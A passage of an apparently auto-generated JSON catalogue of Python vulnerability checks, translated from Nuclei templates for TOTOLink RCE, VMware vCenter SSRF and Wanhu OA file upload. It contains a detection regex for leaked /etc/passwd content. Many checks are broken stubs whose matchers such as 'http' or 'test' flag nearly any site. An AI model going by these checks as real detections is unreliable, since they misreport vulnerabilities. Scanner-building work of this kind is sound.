self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code==200; contains(tolower(body), \"totolink\") / [AND] regex [\\'root:.*:0:0:\\'] | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['root:.*:0:0:']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"TOTOLink Router - Remote Command Execution\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_totolink_boaform_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "totolink",
          "rce",
          "router",
          "boaform",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_vmware_vcenter_ssrf",
        "name": "VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting",
        "language": "Python",
        "famille": "WebApp",
        "description": "VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "interactsh",
            "datatype": "string",
            "required": false,
            "description": "URL Interactsh OOB"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: vmware-vcenter-ssrf\nName: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\nSeverity: critical\nDescription: VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_vmware_vcenter_ssrf:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"vmware-vcenter-ssrf\"\n    SEVERITY = \"critical\"\n    NAME = \"VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: Java']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_vmware_vcenter_ssrf(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: vmware-vcenter-ssrf\nName: VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\nSeverity: critical\nDescription: VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_vmware_vcenter_ssrf:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"vmware-vcenter-ssrf\"\n    SEVERITY = \"critical\"\n    NAME = \"VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'http' | mot(s) 'User-Agent: Java'\"\n\n        # Simple word matcher simulation\n        matchers = ['http', 'User-Agent: Java']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_vmware_vcenter_ssrf(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "ssrf",
          "lfi",
          "xss",
          "oast",
          "vcenter",
          "vmware",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wanhu_oa_fileupload_controller",
        "name": "Wanhu OA Fileupload Controller - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "There is an arbitrary file upload vulnerability in Wanhu OA fileUpload.controller. An attacker can upload any file through the vulnerability.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_1 == 200 && contains(body_1, \"\\\"result\\\":\\\"success\\\"\") && contains(body_1,\"fileSize\"); status_code_2 == 200 && contains(body_2,\"{{result}}\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "rand_str",
            "datatype": "string",
            "required": false,
            "description": "Chaîne aléatoire Nuclei"
          },
          {
            "name": "num1",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num1",
            "default": "{{rand_int(1000, 9999)}}"
          },
          {
            "name": "num2",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: num2",
            "default": "{{rand_int(1000, 9999)}}"
          },
          {
            "name": "result",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: result",
            "default": "{{to_number(num1)*to_number(num2)}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhu-oa-fileupload-controller\nName: Wanhu OA Fileupload Controller - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in Wanhu OA fileUpload.controller. An attacker can upload any file through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhu_oa_fileupload_controller:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhu-oa-fileupload-controller\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA Fileupload Controller - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && contains(body_1, \"\\\\\"result\\\\\":\\\\\"success\\\\\"\") && contains(body_1,\"fileSize\"); status_code_2 == 200 && contains(body_2,\"{{result}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA Fileupload Controller - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhu_oa_fileupload_controller(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: wanhu-oa-fileupload-controller\nName: Wanhu OA Fileupload Controller - Arbitrary File Upload\nSeverity: critical\nDescription: There is an arbitrary file upload vulnerability in Wanhu OA fileUpload.controller. An attacker can upload any file through the vulnerability.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_wanhu_oa_fileupload_controller:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"wanhu-oa-fileupload-controller\"\n    SEVERITY = \"critical\"\n    NAME = \"Wanhu OA Fileupload Controller - Arbitrary File Upload\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_1 == 200 && contains(body_1, \"\\\\\"result\\\\\":\\\\\"success\\\\\"\") && contains(body_1,\"fileSize\"); status_code_2 == 200 && contains(body_2,\"{{result}}\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Wanhu OA Fileupload Controller - Arbitrary File Upload\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_wanhu_oa_fileupload_controller(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "wanhu",
          "oa",
          "fileupload",
          "controller",
          "intrusive",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_wanhuoa_officeserverservlet_file_upload",
        "name": "Wanhu OA OfficeServerServlet - Arbitrary File Upload",
        "language": "Python",
        "famille": "WebApp",
        "description": "Wanhu OA officeserverservlet file upload vulnerability",
        "severity": "critical",
        "detection": "[AND] mot(s) 'DBSTEP V3.0, Post' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
